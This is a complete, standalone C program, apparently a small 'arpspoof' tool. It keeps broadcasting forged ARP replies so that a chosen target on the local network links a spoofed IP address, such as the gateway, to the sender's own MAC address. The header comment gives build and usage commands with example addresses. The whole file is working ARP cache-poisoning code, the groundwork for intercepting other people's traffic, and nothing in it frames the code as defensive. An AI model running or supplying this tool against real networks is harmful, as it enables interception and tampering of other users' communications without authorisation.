/*
 * arpspoof.c - tiny ARP spoofer with NO external dependencies (no scapy, no
 * libpcap). Tells <target_ip> that <spoof_ip> is at this host's MAC.
 *
 * Build:  cc -O2 -o arpspoof arpspoof.c
 * Run:    sudo ./arpspoof <iface> <target_ip> <target_mac> <spoof_ip>
 *         (e.g. ./arpspoof wlan0 192.168.1.50 aa:bb:cc:dd:ee:ff 192.168.1.1)
 *
 * Runs forever; Ctrl-C to stop.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>

static int mac_aton(const char *s, unsigned char *m) {
    return sscanf(s, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6;
}

int main(int argc, char **argv) {
    if (argc != 5) {
        fprintf(stderr, "usage: %s <iface> <target_ip> <target_mac> <spoof_ip>\n", argv[0]);
        return 2;
    }
    struct in_addr tip, sip;
    unsigned char tmac[6];
    if (inet_aton(argv[2], &tip) == 0) { fprintf(stderr, "bad target ip\n"); return 2; }
    if (!mac_aton(argv[3], tmac)) { fprintf(stderr, "bad target mac\n"); return 2; }
    if (inet_aton(argv[4], &sip) == 0) { fprintf(stderr, "bad spoof ip\n"); return 2; }

    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (s < 0) { perror("socket"); return 1; }

    struct ifreq ifr; memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, argv[1], IFNAMSIZ - 1);
    if (ioctl(s, SIOCGIFINDEX, &ifr) < 0) { perror("SIOCGIFINDEX"); return 1; }
    int ifindex = ifr.ifr_ifindex;
    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) { perror("SIOCGIFHWADDR"); return 1; }
    unsigned char mymac[6]; memcpy(mymac, ifr.ifr_hwaddr.sa_data, 6);

    printf("arpspoof: %s: telling %s that %s is at %02x:%02x:%02x:%02x:%02x:%02x\n",
           argv[1], argv[2], argv[4], mymac[0], mymac[1], mymac[2], mymac[3], mymac[4], mymac[5]);

    unsigned char pkt[42];
    memset(pkt, 0xff, 6);               /* dst = broadcast */
    memcpy(pkt + 6, mymac, 6);          /* src */
    pkt[12] = 0x08; pkt[13] = 0x06;     /* ARP */
    pkt[14] = 0x00; pkt[15] = 0x01;     /* ethernet */
    pkt[16] = 0x08; pkt[17] = 0x00;     /* IPv4 */
    pkt[18] = 6; pkt[19] = 4;
    pkt[20] = 0x00; pkt[21] = 0x02;     /* ARP reply */
    memcpy(pkt + 22, mymac, 6);
    memcpy(pkt + 28, &sip.s_addr, 4);   /* sender ip = spoofed */
    memcpy(pkt + 32, tmac, 6);
    memcpy(pkt + 38, &tip.s_addr, 4);

    struct sockaddr_ll addr; memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_ifindex = ifindex;
    addr.sll_halen = 6;
    memset(addr.sll_addr, 0xff, 6);

    for (;;) {
        if (sendto(s, pkt, sizeof(pkt), 0, (struct sockaddr *)&addr, sizeof(addr)) < 0)
            perror("sendto");
        sleep(1);
    }
    return 0;
}
